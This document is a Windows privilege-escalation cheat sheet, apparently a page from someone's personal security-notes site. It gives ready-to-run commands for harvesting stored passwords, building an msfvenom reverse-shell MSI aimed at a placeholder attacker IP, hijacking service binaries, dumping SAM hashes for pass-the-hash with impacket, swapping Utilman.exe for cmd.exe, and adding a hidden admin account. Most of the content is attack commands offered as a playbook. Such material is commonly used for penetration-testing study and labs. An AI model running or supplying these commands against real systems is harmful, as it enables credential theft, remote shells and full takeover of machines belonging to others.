---
title: "Privilege Escalation"
tagName: privilege_escalation
search: exclude
permalink: act_privilege_escalation.html
sidebar: home_sidebar
toc: false
folder: act
---

## The result of techniques that provide an attacker with higher permissions on a system or network.



Windows

Simple checks
These files may have passwords left from unattended installations:
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

Check if a password has been typed in powershell history (run from cmd.exe)
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

IIS web server running?
Check files like this...
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Shortcut...
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

Any saved passwords around?
cmdkey /list
if so get a command line by:
runas /savecred /user:admin cmd.exe

Known cleartext passwords
PuTTY
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

check scheduled tasks to see if there\'s any tasks run as a priviledged user that you might be able to rename your .exe or .bat to?
schtasks


Check if AlwaysInstallElevated is possible with these keys (both need to be set)
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

if it does then....
create an msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
copy it to the target and run
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

Check all services..
wmic service get name,startname

started services only:
wmic service where started=true get  name, startname

Insecure Permissions on Service Executable
check this reg key for any services that might be useful... check for any subkeys called \'security\'
HKLM\SYSTEM\CurrentControlSet\Services\

If you have an unquoted service (i.e. a service executable with spaces, but without quotes we can try to get our exe run instead)


Insecure Service Permissions

If you\'re really lucky...

https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk

You might need to accept the EULA like this....
accesschk64.exe -accepteula

accesschk64.exe qlc service_name
if the permission SERVICE_ALL_ACCESS is there... you\'re in!

copy an exploit across and grant access to everyone
icacls C:\rev-svc3.exe /grant Everyone:F

sc config vulnerable_service binPath= "C:\rev-svc3.exe" obj= LocalSystem




whoami /priv
https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants


Pass-the-Hash attacks

if your user has SeBackup / SeRestore
Save off two registry hives...
reg save hklm\sam C:\
reg save hklm\system C:\

Then use impacket
https://www.kali.org/tools/impacket/

python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
python3.9 /opt/impacket/examples/psexec.py -hashes hashXXXXXXXXX administrator@IP_ADDRESS


If your user has SeTakeOwnership then Bob is your auntie\'s husband...
take ownership
takeown /f C:\Windows\System32\Utilman.exe
take priviledges
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
overwrite the &quot;ease of access&quot; executable
copy cmd.exe utilman.exe
Now when the screen is locked you can gain full system access by clicking on the ease of access icon!



SeImpersonate / SeAssignPrimaryToken

https://github.com/antonioCoco/RogueWinRM



Unpatched Software

get a list of installed programs (also check for programs not listed with wmic)
wmic product get name,version,vendor

Check for exploits for these program versions using google or check on these sites:
https://www.exploit-db.com/
https://packetstormsecurity.com/


Add a new user and make it an admin
net user pwndUser SimplePassw0rd /add & net localgroup administrators pwndUser /add




scripts
To be run on target machine
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

https://github.com/itm4n/PrivescCheck

https://www.metasploit.com/
then use 
multi/recon/local_exploit_suggester


To be run on attack machine
https://github.com/bitsadmin/wesng



Some resources to read over...
https://jlajara.gitlab.io/Potatoes_Windows_Privesc


https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/_LEARNING_AND_SOCIALS/BOOKS.md




{% include taglogic.html %}

{% include links.html %}
